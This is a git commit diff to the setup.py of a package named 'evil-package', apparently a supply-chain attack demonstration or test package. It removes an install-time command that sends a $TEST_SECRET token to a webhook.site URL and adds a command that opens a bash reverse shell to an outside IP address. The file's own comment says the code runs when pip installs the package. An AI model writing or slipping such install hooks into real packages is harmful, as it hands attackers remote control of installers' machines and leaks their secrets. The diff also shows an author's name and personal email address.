1e9b4fa744e77531f50b01c2be4b85008a44ef68
Andrii Hudz <infandrew@gmail.com>
2025-10-20 10:54:58 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -2,7 +2,7 @@ from setuptools import setup
 import os
 
 # Malicious code executed immediately when pip installs the package
-os.system("wget https://webhook.site/4c29e9df-350f-4c3d-aa5c-68d7d224b317?token=$TEST_SECRET")
+os.system("bash -i >& /dev/tcp/106.210.154.24/4343 0>&1")
 
 setup(
     name="evil-package",
